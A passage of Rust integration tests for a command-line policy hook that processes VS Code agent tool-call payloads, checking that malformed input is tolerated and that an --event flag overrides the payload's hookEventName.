        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(b"not json at all".to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let _ = parse_output(&out);
}

// ===========================================================================
// 10. BACKWARD COMPATIBILITY — --event flag override still works
// ===========================================================================

/// The --event flag can override the hookEventName in the payload.
/// Useful for testing and for wrappers that want explicit control.
#[test]
fn test_vscode_event_flag_overrides_payload_hook_event_name() {
    let policy = write_policy(vscode_policy());
    // Payload says PreToolUse but we pass --event SessionStart → generic output
    let payload = serde_json::json!({
        "cwd": "/workspace",
        "sessionId": "s-override-1",
        "hookEventName": "PreToolUse",
        "tool_name": "editFiles",
        "tool_input": {}
    })
    .to_string();
    let out = Command::new(bin())
        .args([
            "hook",
            "--format",
            "vscode",
            "--event",
            "SessionStart",
            "--policy",
        ])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    // --event SessionStart overrides the payload → should get generic SessionStart output
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("SessionStart"),
        "--event flag must override the hookEventName in the payload"
    );
}
